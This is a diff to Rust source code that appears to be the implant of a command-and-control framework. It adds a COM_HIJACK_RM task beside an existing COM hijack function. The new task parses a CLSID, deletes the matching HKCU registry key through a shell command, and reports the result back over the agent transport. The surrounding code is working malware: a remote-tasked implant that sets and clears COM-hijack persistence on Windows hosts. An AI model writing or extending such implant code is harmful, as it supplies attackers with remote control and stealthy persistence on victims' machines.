@@ -313,6 +313,13 @@ fn com_hijack(clsid: &str, dll_path: &str) -> String {
     ))
 }
 
+fn com_hijack_rm(clsid: &str) -> String {
+    shell(&format!(
+        "reg delete \"HKCU\\Software\\Classes\\CLSID\\{}\" /f 2>&1",
+        clsid
+    ))
+}
+
 // ── Dispatch ──────────────────────────────────────────────────────────────────
 
 pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
@@ -378,6 +385,20 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
                 return true;
             }
             let r = com_hijack(clsid, dll_path);
+            t.send_result(task.id, &r, "");
+            true
+        }
+
+        "COM_HIJACK_RM" => {
+            let clsid = serde_json::from_str::<serde_json::Value>(&task.args)
+                .ok()
+                .and_then(|v| v.get("clsid").and_then(|c| c.as_str()).map(String::from))
+                .unwrap_or_else(|| task.args.trim_matches('"').to_string());
+            if clsid.is_empty() {
+                t.send_result(task.id, "", "COM_HIJACK_RM requires {\"clsid\":\"...\"}");
+                return true;
+            }
+            let r = com_hijack_rm(&clsid);
             t.send_result(task.id, &r, "");
             true
         }
